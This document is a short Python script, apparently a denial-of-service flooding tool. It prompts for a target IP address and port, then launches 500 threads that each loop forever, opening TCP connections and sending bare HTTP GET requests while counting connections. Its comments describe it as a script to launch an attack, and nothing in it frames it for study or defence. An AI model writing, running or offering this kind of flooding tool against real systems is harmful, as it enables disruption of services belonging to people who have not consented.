import threading
import socket

target = input('Enter ip address of machine to attack')
port = int(input('Enter port number to attack'))
machine_ip = input('Enter your ip address')

connected_connections = 0


# main script to launch the attack
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + machine_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        # print the connections that are already connected
        global connected_connections
        connected_connections += 1
        print(connected_connections)


# threads to run concurrent connections
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
